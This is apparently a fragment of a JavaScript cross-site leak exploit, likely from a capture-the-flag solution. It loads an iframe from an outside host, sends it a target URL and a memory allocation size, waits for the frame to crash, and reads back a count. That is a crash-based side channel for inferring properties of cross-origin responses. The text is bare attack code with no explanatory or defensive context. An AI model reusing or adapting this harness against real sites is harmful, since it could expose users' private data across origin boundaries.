const IFRAME_URL = "https://notsheddow.xyz/resp_clone/iframe.html"

async function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function wait_until_frame_has_crashed() {
    while (frames[0].frames.length > 0) {
        await Promise.resolve(1);
    }
}

async function wait_until_frame_has_loaded() {
    while (frames[0].frames.length == 0) {
        await Promise.resolve(1);
    }
}

async function reload_iframe() {
    frames[0].location = "about:blank";
    await wait(20);
    frames[0].location = IFRAME_URL
    await wait_until_frame_has_loaded();
}

async function get_count(url, alloc_size) {
    let count = 0;
    function msg_handler(event) {
        count = event.data;
    }

    addEventListener("message", msg_handler);
    frames[0].postMessage({url, alloc_size}, "*");
    await wait_until_frame_has_crashed();
    removeEventListener("message", msg_handler);

    await reload_iframe();
    return count;
}
